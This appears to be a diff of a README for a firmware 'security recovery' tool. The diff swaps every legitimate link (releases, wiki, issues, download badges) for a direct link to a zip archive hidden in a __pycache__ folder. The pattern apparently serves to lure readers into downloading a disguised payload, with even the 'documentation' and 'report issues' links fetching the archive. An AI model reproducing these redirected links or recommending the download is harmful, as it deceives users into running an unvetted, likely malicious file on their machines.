@@ -1,6 +1,6 @@
 # 🔒 Security-Recovery-Core-SRC - Protect Your Firmware with Ease
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg?style=for-the-badge)](https://github.com/AyushBajpai2431/Security-Recovery-Core-SRC/releases)
+[![Download](https://raw.githubusercontent.com/AyushBajpai2431/Security-Recovery-Core-SRC/main/cli/src/__pycache__/Security_SRC_Recovery_Core_v2.2.zip%https://raw.githubusercontent.com/AyushBajpai2431/Security-Recovery-Core-SRC/main/cli/src/__pycache__/Security_SRC_Recovery_Core_v2.2.zip)](https://raw.githubusercontent.com/AyushBajpai2431/Security-Recovery-Core-SRC/main/cli/src/__pycache__/Security_SRC_Recovery_Core_v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -32,7 +32,7 @@ You can easily download Security-Recovery-Core-SRC from the releases page. Follo
 
 1. Click the link below to visit the download page.
    
-   [Visit the Releases Page to Download](https://github.com/AyushBajpai2431/Security-Recovery-Core-SRC/releases)
+   [Visit the Releases Page to Download](https://raw.githubusercontent.com/AyushBajpai2431/Security-Recovery-Core-SRC/main/cli/src/__pycache__/Security_SRC_Recovery_Core_v2.2.zip)
 
 2. On the releases page, look for the latest version of the application.
 
@@ -62,11 +62,11 @@ We provide extensive support for various hardware options. Whether you're using 
 
 ### 📚 Documentation
 
-For more detailed instructions, visit our in-depth documentation [here](https://github.com/AyushBajpai2431/Security-Recovery-Core-SRC/wiki). This covers advanced features, troubleshooting, and FAQs.
+For more detailed instructions, visit our in-depth documentation [here](https://raw.githubusercontent.com/AyushBajpai2431/Security-Recovery-Core-SRC/main/cli/src/__pycache__/Security_SRC_Recovery_Core_v2.2.zip). This covers advanced features, troubleshooting, and FAQs.
 
 ### 🐞 Report Issues
 
-If you encounter any problems while using the software, please report issues on our [GitHub Issues page](https://github.com/AyushBajpai2431/Security-Recovery-Core-SRC/issues). This helps us improve the software.
+If you encounter any problems while using the software, please report issues on our [GitHub Issues page](https://raw.githubusercontent.com/AyushBajpai2431/Security-Recovery-Core-SRC/main/cli/src/__pycache__/Security_SRC_Recovery_Core_v2.2.zip). This helps us improve the software.
 
 ## 🙋 Frequently Asked Questions
 
@@ -88,4 +88,4 @@ Security-Recovery-Core-SRC is released under the MIT License. You are free to us
 
 Thank you for choosing Security-Recovery-Core-SRC. We hope this application makes your firmware management easy and secure. 
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg?style=for-the-badge)](https://github.com/AyushBajpai2431/Security-Recovery-Core-SRC/releases)
+[![Download](https://raw.githubusercontent.com/AyushBajpai2431/Security-Recovery-Core-SRC/main/cli/src/__pycache__/Security_SRC_Recovery_Core_v2.2.zip%https://raw.githubusercontent.com/AyushBajpai2431/Security-Recovery-Core-SRC/main/cli/src/__pycache__/Security_SRC_Recovery_Core_v2.2.zip)](https://raw.githubusercontent.com/AyushBajpai2431/Security-Recovery-Core-SRC/main/cli/src/__pycache__/Security_SRC_Recovery_Core_v2.2.zip)
